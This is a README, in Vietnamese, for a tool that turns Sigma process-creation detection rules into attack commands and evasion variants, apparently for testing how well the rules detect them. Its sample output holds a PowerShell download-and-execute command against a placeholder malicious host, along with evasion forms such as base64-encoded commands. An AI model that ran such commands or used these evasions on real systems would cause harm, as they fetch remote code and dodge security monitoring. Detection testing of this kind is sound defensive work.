# attack_convert/ – Evasion Command Generator Tool

Công cụ này giúp **tạo các lệnh tấn công gốc và né tránh (evasion)** từ các rule Sigma trong thư mục `process_creation`, dựa trên danh sách rule có thể bị bypass được định nghĩa trong `evasion_possible_rules.txt`.

---

## Cấu trúc thư mục

```bash
Sigma-automation/
├── attack_convert/
│   ├── main.py                      # File chính để chạy
│   ├── utils/
│   │   ├── parser.py                # Hàm trích xuất lệnh command
│   │   ├── evasions_core.py         # Gom các evasion lại
│   │   └── evasions/
│   │       ├── insertion.py
│   │       ├── substitution.py
│   │       ├── omission.py
│   │       ├── reordering.py
│   │       └── recoding.py
```

---

### Cách chạy

#### 1. Chuẩn bị thư mục rule

- Đặt các rule `.yml` tại:  
  `data/rules/windows/process_creation/`
- File chứa danh sách rule có thể bypass (tên không đổi):  
  `evasion_possible_rules.txt`

#### 2. Thiết lập `PYTHONPATH` và chạy

##### Với Windows (CMD)

```bash
set PYTHONPATH=D:\...\Sigma-automation
python -m attack_convert.main
```

##### Hoặc dùng PowerShell

```bash
$env:PYTHONPATH="D:\...\Sigma-automation"
python -m attack_convert.main
```

---

### 📤 Kết quả

- Kết quả sẽ được ghi vào thư mục:

  ```plaintext

  attack_convert/Evasion-Results/

  ```

- Mỗi file `.json` sẽ chứa:
  - Lệnh tấn công gốc (`original_command`)
  - 5 kỹ thuật né tránh (`insertion`, `substitution`, `omission`, `reordering`, `recoding`)

---

### 💡 Ví dụ nội dung file kết quả

```bash
{
  "rule_name": "suspicious_powershell_0",
  "original_command": "powershell.exe -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious')\"",
  "evasions": 
  {
    "insertion": "powershell.exe -Command \"...\" # bypass",
    "substitution": "powershell.exe -c \"...\"",
    "omission": "powershell.exe \"...\"",
    "reordering": "powershell.exe \"...\" -Command",
    "recoding": "powershell.exe -EncodedCommand <base64>"
  }
}
```

---

### 🛠️ Yêu cầu

- Python 3.10 trở lên
- Cài `pyyaml` nếu chưa có:

```bash
pip install pyyaml
```
